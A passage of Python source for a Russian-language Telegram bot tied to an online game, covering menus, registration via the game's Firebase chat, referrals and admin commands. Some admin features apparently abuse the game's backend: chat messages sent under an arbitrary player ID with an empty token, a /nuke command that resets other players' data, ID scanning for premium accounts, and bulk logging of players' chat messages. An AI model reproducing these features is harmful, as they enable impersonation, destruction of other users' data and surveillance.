    elif text == "◀️ Назад":
        if is_admin_or_owner(user_id):
            await show_admin_menu(update, context)
        else:
            await show_user_profile(update, context)
        return

    if text == "👤 Меню игрока":
        await show_user_profile(update, context)
    elif text == "⚙️ Админ-меню":
        if not is_admin_or_owner(user_id):
            await update.message.reply_text("⛔ Доступ запрещён")
            return
        await show_admin_menu(update, context)
    elif text == "👥 Друзья" and not context.user_data.get('in_settings'):
        keyboard = [
            [KeyboardButton("🧟 Добавить друга")],
            [KeyboardButton("👤 Список друзей")],
            [KeyboardButton("🕓 Активные запросы")],
            [KeyboardButton("◀️ Назад в профиль")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("👤 Управление друзьями\nВыберите действие:", reply_markup=reply_markup)
    elif text == "⚡ Реферальная система":
        await referral_system(update, context)
    elif text == "🍪 Инвентарь":
        user_id_str = str(user_id)
        context.user_data['last_inventory_target'] = user_id_str
        await show_inventory(update, context, user_id_str, user_id, page=0, mode="self")
    elif text == "🔄 Обмены":
        keyboard = [
            [KeyboardButton("📤 Исходящие")],
            [KeyboardButton("📥 Входящие")],
            [KeyboardButton("◀️ Назад в профиль")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("Меню обменов:", reply_markup=reply_markup)
    elif text == "📤 Исходящие":
        await show_outgoing_exchanges(update, context)
    elif text == "📥 Входящие":
        await show_incoming_exchanges(update, context)
    elif text == "⚙️ Настройки":
        context.user_data['in_settings'] = True
        await settings_menu(update, context)
    elif text == "🎫 Промокоды":
        await promo_menu(update, context)
    elif text == "✅ Активировать промокод":
        awaiting_activate_promo[user_id] = True
        await activate_promo_start(update, context)
        return
    elif text == "🔍 Посмотреть чужой профиль":
        awaiting_view_profile[user_id] = True
        await view_other_profile_start(update, context)
        return
    elif text == "🧟 Добавить друга":
        await friend_add_start(update, context)
    elif text == "👤 Список друзей":
        await friend_list(update, context)
    elif text == "🕓 Активные запросы":
        await friend_requests_list(update, context)
    elif text == "👤 Мой профиль (админ)":
        await admin_profile(update, context)
    elif text == "🔍 Найти игрока":
        if is_admin_or_owner(user_id):
            awaiting_search[user_id] = True
            await update.message.reply_text("• Найти игрока в боте по нику?\nВведите имя пользователя в чат для поиска:")
        else:
            await update.message.reply_text("⛔ Недоступно")
    else:
        # Остальные случаи
        pass

# ============= РЕГИСТРАЦИЯ ЧЕРЕЗ ЧАТ =============
def generate_code() -> str:
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def check_message_in_firebase(message_text: str, chat_type: str) -> Optional[dict]:
    try:
        url = f"{FIREBASE_URL}/Chat/Messages/{chat_type}.json?orderBy=\"ts\"&limitToLast=5000"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            messages = response.json()
            if messages:
                for msg_id, msg in messages.items():
                    if msg.get('msg') == message_text:
                        return {
                            "success": True,
                            "userID": msg.get('playerID'),
                            "nick": msg.get('nick')
                        }
        return None
    except Exception as e:
        logger.error(f"Ошибка проверки Firebase: {e}")
        return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    players = load_json(PLAYERS_FILE, {})

    if context.args and len(context.args) > 0:
        param = context.args[0]
        if param.startswith("friend_profile_"):
            friend_nick = param[15:]
            await friend_profile_by_link(friend_nick, user_id, context)
            return
        elif param.startswith("friend_delete_"):
            friend_nick = param[14:]
            result = await friend_delete_by_link(friend_nick, user_id, context)
            await update.message.reply_text(result)
            return
        else:
            context.user_data['referral_code'] = param

    if str(user_id) in players:
        role = players[str(user_id)].get('role', 'user')
        if role == 'user':
            await show_user_profile(update, context)
        else:
            keyboard = [
                [KeyboardButton("👤 Меню игрока")],
                [KeyboardButton("⚙️ Админ-меню")]
            ]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.message.reply_text("Выберите меню:", reply_markup=reply_markup)
        return

    keyboard = [
        [InlineKeyboardButton("🇷🇺 RU", callback_data='reg_chat_RU')],
        [InlineKeyboardButton("🇺🇸 US", callback_data='reg_chat_US')],
        [InlineKeyboardButton("🇩🇪 DE", callback_data='reg_chat_DE')],
        [InlineKeyboardButton("🇵🇱 PL", callback_data='reg_chat_PL')],
        [InlineKeyboardButton("🇺🇦 UA", callback_data='reg_chat_UA')],
        [InlineKeyboardButton("⭐ PREMIUM", callback_data='reg_chat_PREMIUM')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Выберите игровой чат для подтверждения:",
        reply_markup=reply_markup
    )

async def chat_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat = query.data.split('_')[2]
    context.user_data['reg_chat'] = chat
    code = generate_code()
    context.user_data['reg_code'] = code
    await query.edit_message_text(
        f"Выбран чат: {chat}\n"
        f"Отправьте в этот игровой чат код: {code}\n"
        "Затем нажмите /confirm"
    )

async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if 'reg_chat' not in context.user_data or 'reg_code' not in context.user_data:
        await update.message.reply_text("Сначала выполните /start и выберите чат")
        return

    chat = context.user_data['reg_chat']
    code = context.user_data['reg_code']
    result = check_message_in_firebase(code, chat)

    if result and result.get("success"):
        game_id = result.get("userID")
        game_nick = result.get("nick")

        players = load_json(PLAYERS_FILE, {})
        role = "owner" if int(user_id) == OWNER_ID else "user"

        ref_code = generate_referral_code()
        referrer_code = context.user_data.get('referral_code')
        referrer_id = None
        if referrer_code:
            for tid, pdata in players.items():
                if pdata.get('referral_code') == referrer_code:
                    referrer_id = tid
                    if referrer_id == user_id:
                        referrer_id = None
                    break

        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        players[user_id] = {
            "role": role,
            "telegram_id": int(user_id),
            "tg_username": update.effective_user.username,
            "tg_first_name": update.effective_user.first_name,
            "tg_last_name": update.effective_user.last_name,
            "tg_full_name": update.effective_user.full_name,
            "tg_language_code": getattr(update.effective_user, "language_code", None),
            "registered_at": now_str,
            "registration_unix": int(time.time()),
            "last_command_at": now_str,
            "last_seen_at": now_str,
            "commands_count": 0,
            "game_chat": chat,
            "game_id": game_id,
            "game_nick": game_nick,
            "banned": False,
            "admin_expires": None,
            "coins": 0,
            "tokens": 0,
            "friends": [],
            "friend_requests": [],
            "referral_code": ref_code,
            "referrer": referrer_id,
            "referral_count": 0,
            "auto_add_friend": True
        }
        save_json(PLAYERS_FILE, players)

        if referrer_id:
            players[referrer_id]['coins'] = players[referrer_id].get('coins', 0) + REFERRAL_BONUS
            players[referrer_id]['referral_count'] = players[referrer_id].get('referral_count', 0) + 1
            save_json(PLAYERS_FILE, players)

            try:
                await context.bot.send_message(
                    chat_id=int(referrer_id),
                    text=f"🎉 По вашей реферальной ссылке зарегистрировался новый пользователь {game_nick}!\n💰 Вам начислено {format_coins(REFERRAL_BONUS)} монет."
                )
            except Exception as e:
                logger.error(f"Не удалось уведомить реферера {referrer_id}: {e}")

            if players[referrer_id].get('auto_add_friend', True):
                referrer_nick = players[referrer_id].get('game_nick')
                if referrer_nick:
                    if 'friend_requests' not in players[user_id]:
                        players[user_id]['friend_requests'] = []
                    players[user_id]['friend_requests'].append(referrer_nick)
                    save_json(PLAYERS_FILE, players)

                    try:
                        await context.bot.send_message(
                            chat_id=int(user_id),
                            text=(
                                f"✉️ Вам пришел запрос в друзья от {referrer_nick} (по реферальной ссылке)!\n\n"
                                f"Хотите принять?"
                            ),
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("✅ Принять", callback_data=f"friend_accept|{referrer_nick}"),
                                 InlineKeyboardButton("❌ Отклонить", callback_data=f"friend_decline|{referrer_nick}")]
                            ])
                        )
                    except Exception as e:
                        logger.error(f"Не удалось отправить запрос в друзья: {e}")

        await update.message.reply_text(
            f"✅ Регистрация успешна!\n"
            f"Игровой ник: {game_nick}\n"
            f"ID: {game_id}"
        )
        del context.user_data['reg_chat']
        del context.user_data['reg_code']
        if 'referral_code' in context.user_data:
            del context.user_data['referral_code']

        await show_user_profile(update, context)
    else:
        await update.message.reply_text(
            f"❌ Код не найден в чате {chat}. Попробуйте снова /start"
        )

# ============= ФУНКЦИИ МОНИТОРИНГА =============
def load_config() -> Dict[str, str]:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Ошибка загрузки конфига: {e}")
            return DEFAULT_LINKS.copy()
    else:
        return DEFAULT_LINKS.copy()

def save_config(config: Dict[str, str]):
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Ошибка сохранения конфига: {e}")

channel_config = load_config()
thread_to_channel: Dict[int, str] = {}

def update_thread_mapping():
    global thread_to_channel
    thread_to_channel.clear()
    for game_ch, link in channel_config.items():
        res = parse_telegram_link(link)
        if res:
            _, thread_id = res
            thread_to_channel[thread_id] = game_ch

def parse_telegram_link(link: str) -> Optional[Tuple[int, int]]:
    match = re.search(r'/c/(\d+)/(\d+)', link)
    if match:
        chat_id = int(f"-100{match.group(1)}")
        thread_id = int(match.group(2))
        return (chat_id, thread_id)
    return None

def get_chat_thread(game_channel: str) -> Optional[Tuple[int, int]]:
    link = channel_config.get(game_channel.upper())
    if link:
        return parse_telegram_link(link)
    return None

update_thread_mapping()

def extract_nick_from_text(text: str) -> Optional[str]:
    match = re.search(r'\[.*?\] \[(.*?)\]:', text)
    return match.group(1) if match else None

def format_moscow_time(ts: int) -> str:
    """Конвертирует timestamp (мс) в московское время и форматирует как ДД.ММ.ГГ ЧЧ:ММ"""
    try:
        dt_utc = datetime.fromtimestamp(ts / 1000, tz=timezone.utc)
        dt_msk = dt_utc.astimezone(timezone(timedelta(hours=3)))
        return dt_msk.strftime("%d.%m.%y %H:%M")
    except:
        return "??.??.?? ??:??"

def get_player_description(player_id: str) -> str:
    """Получает описание профиля игрока из игры."""
    if player_id in description_cache:
        return description_cache[player_id]
    url = f"{API_BASE_URL}/equipment/getEQ?playerID={player_id}"
    try:
        resp = requests.get(url, timeout=MONITOR_CONFIG["REQUEST_TIMEOUT"])
        if resp.status_code == 200:
            data = resp.json()
            desc = data.get('description', '')
            if desc:
                description_cache[player_id] = desc
                return desc
    except Exception as e:
        logger.error(f"Ошибка получения описания для {player_id}: {e}")
    description_cache[player_id] = "нет описания"
    return "нет описания"

def _has_cyrillic(text: str) -> bool:
    return bool(re.search('[а-яА-Я]', text))

def _fetch_user_id(query: str) -> str:
    url = f"{API_BASE_URL}/social/findUser?{query}"
    try:
        r = requests.get(url, timeout=MONITOR_CONFIG["REQUEST_TIMEOUT"])
        r.raise_for_status()
        return str(r.json()["_id"])
    except Exception as e:
        logger.error(f"Ошибка fetch user: {e}")
        return "error: user not found or API error"

def _get_id_from_chat(keyword: str, chat_region: str) -> str:
    url = f"{FIREBASE_URL}/Chat/Messages/{chat_region}.json?orderBy=\"ts\"&limitToLast=20"
    for attempt in range(MONITOR_CONFIG["RETRY_ATTEMPTS"]):
        try:
            r = requests.get(url, timeout=MONITOR_CONFIG["REQUEST_TIMEOUT"])
            messages = r.json()
            if not messages:
                return "error: no messages"
            for msg in messages.values():
                if (keyword.lower() in msg.get('msg', '').lower() or
                    keyword.lower() in msg.get('nick', '').lower()):
                    return msg.get('playerID', 'error: ID not found')
            return "error: user not found in last 20 messages"
        except Exception as e:
            if attempt < MONITOR_CONFIG["RETRY_ATTEMPTS"] - 1:
                time.sleep(MONITOR_CONFIG["RETRY_DELAY"])
                continue
            return f"error: {str(e)}"
    return "error: unknown"

def get_user_id(nickname: Optional[str], chat_region: str, keyword: Optional[str] = None) -> str:
    if keyword:
        return _get_id_from_chat(keyword, chat_region)
    if not nickname:
        return "error: no nickname provided"
    if nickname.startswith('#'):
        try:
            if len(nickname) < 7:
                return "error: invalid hash format"
            first = int(nickname[1:3], 16)
            second = int(nickname[3:5], 16)
            third = int(nickname[5:7], 16)
            numeric_id = str(first * 65536 + second * 256 + third)
            return _fetch_user_id(f"ID={numeric_id}")
        except Exception as e:
            logger.error(f"Ошибка парсинга хеша: {e}")
            return "error: invalid hash format"
    if _has_cyrillic(nickname):
        try:
            import base64
            enc = base64.b64encode(nickname.encode()).decode()
            return _fetch_user_id(f"nick=@{enc}")
        except Exception as e:
            logger.error(f"Ошибка кодирования кириллицы: {e}")
            return "error: encoding failed"
    return _fetch_user_id(f"nick={nickname}")

def get_player_nick(player_id: str) -> Optional[str]:
    if player_id in nick_cache:
        return nick_cache[player_id]
    url = f"{API_BASE_URL}/social/findUser?ID={player_id}"
    try:
        r = requests.get(url, timeout=MONITOR_CONFIG["REQUEST_TIMEOUT"])
        if r.status_code == 200:
            data = r.json()
            nick = data.get('nick')
            if nick:
                nick_cache[player_id] = nick
                return nick
    except Exception as e:
        logger.error(f"Ошибка получения ника по ID {player_id}: {e}")
    return None

def send_chat_message(sender_id: str, message: str, channel: str) -> bool:
    url = f"{API_BASE_URL}/social/sendChat"
    params = {
        "token": "",
        "playerID": sender_id,
        "message": message,
        "channel": channel
    }
    try:
        resp = requests.get(url, params=params, timeout=MONITOR_CONFIG["REQUEST_TIMEOUT"])
        if resp.status_code == 200:
            return True
        else:
            logger.error(f"Ошибка отправки в игру: {resp.status_code} {resp.text}")
            return False
    except Exception as e:
        logger.error(f"Исключение при отправке: {e}")
        return False

async def safe_send_message(bot, chat_id: int, text: str, thread_id: int = None) -> bool:
    key = (chat_id, thread_id or 0)
    now = time.time()
    if key in flood_until and now < flood_until[key]:
        return False
    try:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            message_thread_id=thread_id
        )
        if key in flood_until:
            del flood_until[key]
        return True
    except RetryAfter as e:
        flood_until[key] = now + e.retry_after
        logger.warning(f"Flood control для чата {chat_id}, тема {thread_id}, ждём {e.retry_after} сек")
        return False
    except Exception as e:
        logger.error(f"Ошибка отправки в Telegram-чат {chat_id} (тема {thread_id}): {e}")
        return False

async def monitor_worker(bot):
    global monitor_running
    seen_ids: Dict[str, Set[str]] = {ch: set() for ch in channel_config.keys()}
    while monitor_running:
        for game_channel in channel_config.keys():
            if not monitor_running:
                break
            tg_info = get_chat_thread(game_channel)
            if not tg_info:
                continue
            tg_chat_id, tg_thread_id = tg_info
            url = f"{FIREBASE_URL}/Chat/Messages/{game_channel}.json?orderBy=\"ts\"&limitToLast={MONITOR_CONFIG['MAX_MESSAGES']}"
            messages = None
            for attempt in range(MONITOR_CONFIG["RETRY_ATTEMPTS"]):
                try:
                    r = requests.get(url, timeout=MONITOR_CONFIG["REQUEST_TIMEOUT"])
                    messages = r.json()
                    break
                except Exception as e:
                    if attempt < MONITOR_CONFIG["RETRY_ATTEMPTS"] - 1:
                        await asyncio.sleep(MONITOR_CONFIG["RETRY_DELAY"])
                        continue
            if not messages:
                continue
            sorted_msgs = sorted(messages.items(), key=lambda x: x[1].get('ts', 0))
            for msg_id, msg in sorted_msgs:
                if msg_id not in seen_ids[game_channel]:
                    ts = msg.get('ts', 0)
                    nick = msg.get('nick', '?')
                    text = msg.get('msg', '')
                    player_id = msg.get('playerID', 'неизвестно')
                    moscow_time = format_moscow_time(ts)
                    description = get_player_description(player_id)
                    out = (
                        f"•время: [{moscow_time}]\n"
                        f"|  чат: [{game_channel}]\n"
                        f"|  сообщение ⤵\n"
                        f"|•{text}\n"
                        f"|\n"
                        f"================================\n"
                        f"| Айди отправителя: {player_id}\n"
                        f"| Ник отправителя: {nick}\n"
                        f"•Описание профиля отправителя ⤵\n"
                        f"| \"{description}\"\n"
                        f"============================"
                    )
                    await safe_send_message(bot, tg_chat_id, out, tg_thread_id)
                    save_message_to_log(game_channel, msg_id, msg)
                    seen_ids[game_channel].add(msg_id)
            await asyncio.sleep(1)
        await asyncio.sleep(MONITOR_CONFIG["UPDATE_INTERVAL"])

def get_log_path(channel: str) -> str:
    return os.path.join(LOG_DIR, f"{channel}logs.json")

def load_log_ids(channel: str) -> Set[str]:
    log_path = get_log_path(channel)
    if os.path.exists(log_path):
        try:
            with open(log_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            return set(data.keys())
        except Exception as e:
            logger.error(f"Ошибка загрузки логов {channel}: {e}")
            return set()
    return set()

def save_message_to_log(channel: str, msg_id: str, msg_data: dict):
    log_path = get_log_path(channel)
    if os.path.exists(log_path):
        try:
            with open(log_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except:
            data = {}
    else:
        data = {}
    data[msg_id] = msg_data
    try:
        with open(log_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Ошибка сохранения лога для {channel}: {e}")

async def monitor_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недоступно")
        return
    global monitor_running, monitor_task
    if monitor_running:
        await update.message.reply_text("⚠️ Мониторинг уже запущен")
        return
    monitor_running = True
    monitor_task = asyncio.create_task(monitor_worker(context.bot))
    active_tasks["Мониторинг"] = monitor_task
    await update.message.reply_text("✅ Мониторинг запущен. Сообщения будут пересылаться в указанные Telegram-чаты.")
    update_player_stats(update.effective_user.id, update.effective_user)


async def help_player_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    text = (
        "📋 Доступные команды (игрок):\n\n"
        "/start - главное меню / регистрация\n"
        "/profile - показать профиль\n"
        "/money - показать баланс монет\n"
        "/tokens - показать баланс токенов\n"
        "/myitems - показать инвентарь\n"
        "/help - это сообщение\n\n"
        "Это меню помощи игрока, открытое администратором."
    )
    await update.message.reply_text(text)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недоступно")
        return
    if monitor_running:
        await update.message.reply_text("📡 Мониторинг активен.")
    else:
        await update.message.reply_text("⏸ Мониторинг не запущен.")
    update_player_stats(update.effective_user.id, update.effective_user)

async def channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недоступно")
        return
    text = "🔗 Текущие привязки каналов:\n"
    for game, link in channel_config.items():
        text += f"• {game}: {link}\n"
    await update.message.reply_text(text)
    update_player_stats(update.effective_user.id, update.effective_user)

async def setlink_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недоступно")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /setlink <канал> <ссылка>\nПример: /setlink RU https://t.me/c/3534308756/3")
        return
    game = args[0].upper()
    allowed = ["RU", "UA", "US", "PL", "DE", "PREMIUM", "DEV"]
    if game not in allowed:
        await update.message.reply_text(f"Неверный канал. Допустимы: {', '.join(allowed)}")
        return
    link = ' '.join(args[1:])
    if not re.match(r'^https://t\.me/c/\d+/\d+$', link):
        await update.message.reply_text("❌ Неверный формат ссылки. Должно быть https://t.me/c/XXXXXX/YYY")
        return
    channel_config[game] = link
    save_config(channel_config)
    update_thread_mapping()
    await update.message.reply_text(f"✅ Ссылка для канала {game} изменена на: {link}")
    update_player_stats(update.effective_user.id, update.effective_user)

async def setid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Укажите новый ID: /setid EfezAdmin1")
        return
    sender_ids[update.effective_chat.id] = args[0]
    await update.message.reply_text(f"✅ ID отправителя для этого чата изменён на: {args[0]}")
    update_player_stats(update.effective_user.id, update.effective_user)

async def showid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    current = sender_ids.get(update.effective_chat.id, DEFAULT_SENDER_ID)
    await update.message.reply_text(f"🆔 Текущий ID отправителя: {current}")
    update_player_stats(update.effective_user.id, update.effective_user)

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Использование: /block trade | /block trade stop | /block trade status")
        return
    if args[0].lower() == "trade":
        if len(args) == 1:
            if blocker_is_running():
                await update.message.reply_text("⚠️ Блокировка уже запущена")
                return
            start_blocker(context.bot, TRADE_NOTIFY_CHAT, TRADE_NOTIFY_THREAD, active_tasks)
            await update.message.reply_text("✅ Блокировка трейдов запущена. Новые обмены будут приниматься.")
        elif args[1].lower() == "stop":
            if stop_blocker():
                await update.message.reply_text("✅ Блокировка остановлена")
            else:
                await update.message.reply_text("❌ Блокировка не была запущена")
        elif args[1].lower() == "status":
            stats = get_blocker_stats()
            text = f"📊 Статистика блокировки трейдов\n• Всего заблокировано: {stats['blocked']}"
            text += f"\n• Статус: {'🔴 работает' if stats['running'] else '⏸ остановлен'}"
            await update.message.reply_text(text)
        else:
            await update.message.reply_text("Неизвестная подкоманда. Используй /block trade [stop|status]")
    else:
        await update.message.reply_text("Неизвестная команда. Используй /block trade")
    update_player_stats(update.effective_user.id, update.effective_user)

async def skin_download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    skin_file = "skins/skin.json"
    if not os.path.exists(skin_file):
        await update.message.reply_text("❌ Файл с информацией о скинах ещё не создан.")
        return
    with open(skin_file, "rb") as doc:
        await context.bot.send_document(chat_id=update.effective_chat.id, document=doc, filename="skin.json")
    update_player_stats(update.effective_user.id, update.effective_user)

async def parsing_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Использование: /parsing start | /parsing stop | /parsing status")
        return
    global parser_thread, parser_stop_event
    if args[0].lower() == "start":
        if parser_thread and parser_thread.is_alive():
            await update.message.reply_text("⚠️ Парсер уже запущен")
            return
        parser_stop_event = threading.Event()
        parser_thread = threading.Thread(target=run_parser, args=("parsing", parser_stop_event), daemon=True)
        parser_thread.start()
        await update.message.reply_text("✅ Парсер запущен. Файлы сохраняются в папку parsing/")
    elif args[0].lower() == "stop":
        if not parser_thread or not parser_thread.is_alive():
            await update.message.reply_text("❌ Парсер не запущен")
            return
        parser_stop_event.set()
        await update.message.reply_text("🛑 Парсер остановлен")
    elif args[0].lower() == "status":
        stats = get_parser_stats()
        status_text = "🔴 работает" if stats['running'] else "⏸ остановлен"
        text = (
            f"📊 Статус парсера\n"
            f"• Состояние: {status_text}\n"
            f"• Проверено ID (producer): {stats['producer_checked']}\n"
            f"• Найдено премиумов: {stats['producer_found_premium']}\n"
            f"• Обработано ID (consumer): {stats['consumer_processed']}"
        )
        await update.message.reply_text(text)
    else:
        await update.message.reply_text("Неизвестная подкоманда. Используй start, stop или status.")
    update_player_stats(update.effective_user.id, update.effective_user)

# ============= НОВАЯ ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ИНФОРМАЦИИ ОБ ИГРОКЕ (АНАЛОГ /id) =============
async def get_player_info_text(bot, player_id: str) -> Tuple[str, Optional[InlineKeyboardMarkup]]:
    """Возвращает (текст, клавиатура) для отображения информации об игроке по его game_id."""
    try:
        url_find = f"{API_BASE_URL}/social/findUser?ID={player_id}"
        resp_find = requests.get(url_find, timeout=5)
        if resp_find.status_code != 200:
            return "❌ Игрок с таким ID не найден в игре", None
        user_data = resp_find.json()
    except Exception as e:
        logger.error(f"Ошибка при запросе findUser: {e}")
        return "❌ Ошибка при обращении к API", None

    eq_data = {}
    try:
        url_eq = f"{API_BASE_URL}/equipment/getEQ?playerID={player_id}"
        resp_eq = requests.get(url_eq, timeout=5)
        if resp_eq.status_code == 200:
            eq_data = resp_eq.json()
    except Exception as e:
        logger.error(f"Ошибка при запросе getEQ: {e}")

    text = f"• Найден игрок в игре: {user_data.get('nick', '?')}\n"
    text += f"- Айди: {player_id}\n"
    data_field = user_data.get('data', {})
    if isinstance(data_field, dict):
        data_field = json.dumps(data_field, ensure_ascii=False)
    text += f"- Data: {data_field}\n"
    eq_inv = eq_data.get('eq', {})
    if isinstance(eq_inv, dict):
        eq_inv = json.dumps(eq_inv, ensure_ascii=False)
    text += f"- Инвентарь ⤵\n{eq_inv}\n"
    text += f"- Описание: {eq_data.get('description', 'нет')}\n"
    text += f"- Аватар: {user_data.get('avatar', 'нет')}\n"
    text += f"- Рамка: {user_data.get('frame', 'нет')}\n"
    text += f"- Страна: {user_data.get('country', 'нет')}\n"
    text += f"- Премиум: {'Да' if user_data.get('premium', False) else 'Нет'}\n"
    text += f"- Версия: {user_data.get('version', '?')}\n"
    blocked = user_data.get('blocked', [])
    if isinstance(blocked, list):
        blocked = ', '.join(blocked) if blocked else 'нет'
    text += f"- Заблокированные пользователи: {blocked}\n"

    players = load_json(PLAYERS_FILE, {})
    registered = False
    bot_data = None
    tid = None
    for t, pdata in players.items():
        if pdata.get('game_id') == player_id:
            registered = True
            bot_data = pdata
            tid = t
            break

    text += f"\nЗарегестрирован ли игрок в боте? {'✅ Да' if registered else '❌ Нет'}\n"
    keyboard = None
    if registered:
        text += f"Информация о зарегестрированном игроке ⤵\n"
        text += f"- Telegram ID: {tid}\n"
        text += f"- Ник в боте: {bot_data.get('game_nick', 'неизвестно')}\n"
        text += f"- Монеты: {format_coins(bot_data.get('coins', 0))}\n"
        text += f"- Токены: {bot_data.get('tokens', 0)}\n"
        text += f"- Друзей: {len(bot_data.get('friends', []))}\n"
        text += f"- Рефералов: {bot_data.get('referral_count', 0)}\n"
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🍪 Инвентарь (бот)", callback_data=f"admin_inventory|{tid}")]
        ])
    return text, keyboard

# ============= ОБНОВЛЁННАЯ КОМАНДА /NUKE =============

async def nuke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недоступно")
        return

    player_id = None
    if context.args and len(context.args) > 0:
        player_id = context.args[0]
    elif update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        if replied_msg.from_user.id != context.bot.id:
            await update.message.reply_text("❌ Можно отвечать только на сообщения, отправленные ботом (из мониторинга).")
            return
        match = re.search(r'\[.*?\] \[(.*?)\]:', replied_msg.text)
        if not match:
            await update.message.reply_text("❌ Не удалось извлечь ник")
            return
        nick = match.group(1)
        thread_id = replied_msg.message_thread_id
        game_channel = thread_to_channel.get(thread_id) if thread_id else "RU"
        player_id = get_user_id(nick, game_channel)
        if player_id.startswith("error"):
            await update.message.reply_text(f"❌ Не удалось найти ID для {nick}")
            return
    else:
        await update.message.reply_text("❌ Используйте /nuke <айди> или ответьте на сообщение игрока")
        return

    try:
        check_resp = requests.get(f"{API_BASE_URL}/social/findUser?ID={player_id}", timeout=5)
        if check_resp.status_code != 200:
            await update.message.reply_text("❌ Такой айди не найден в игре")
            return
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка проверки ID: {e}")
        return

    status_msg = await update.message.reply_text("🍪 Проверка айди...")
    await asyncio.sleep(0.5)
    await status_msg.edit_text("⚙️ Обработка пользователя...")
    await asyncio.sleep(0.5)
    await status_msg.edit_text("♻️ Еще совсем чуть чуть...")
    await asyncio.sleep(0.5)

    success, result_msg = nuke_player(player_id)
    if success:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Посмотреть", callback_data=f"nuke_view|{player_id}")]])
        await status_msg.edit_text("✅ Готово! Данные пользователя сброшены.", reply_markup=keyboard)
    else:
        error_text = f"❗Ошибка, не удалось сбросить данные пользователя. Подробности ошибки ⤵\n{result_msg}"
        if len(error_text) > 4096:
            error_text = error_text[:4000] + "...\n(сообщение обрезано)"
        await status_msg.edit_text(error_text)
    update_player_stats(update.effective_user.id, update.effective_user)

async def nuke_view_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    if len(data) < 2:
        await query.edit_message_text("Ошибка: неверные данные")
        return
    player_id = data[1]

    # Получаем информацию об игроке
    text, keyboard = await get_player_info_text(context.bot, player_id)
    # Отправляем новым сообщением (не редактируем старое)
    await context.bot.send_message(
        chat_id=query.from_user.id,
        text=text,
        reply_markup=keyboard
    )

# ============= КОМАНДА /id (ПОИСК ИГРОКА ПО ID В ИГРЕ) =============
async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Использование: /id <айди игрока>")
        return
    player_id = args[0].strip()

    try:
        url_find = f"{API_BASE_URL}/social/findUser?ID={player_id}"
        resp_find = requests.get(url_find, timeout=5)
        if resp_find.status_code != 200:
            await update.message.reply_text("❌ Игрок с таким ID не найден в игре")
            return
        user_data = resp_find.json()
    except Exception as e:
        logger.error(f"Ошибка при запросе findUser: {e}")
        await update.message.reply_text("❌ Ошибка при обращении к API")
        return

    eq_data = {}
    try:
        url_eq = f"{API_BASE_URL}/equipment/getEQ?playerID={player_id}"
        resp_eq = requests.get(url_eq, timeout=5)
        if resp_eq.status_code == 200:
            eq_data = resp_eq.json()
    except Exception as e:
        logger.error(f"Ошибка при запросе getEQ: {e}")

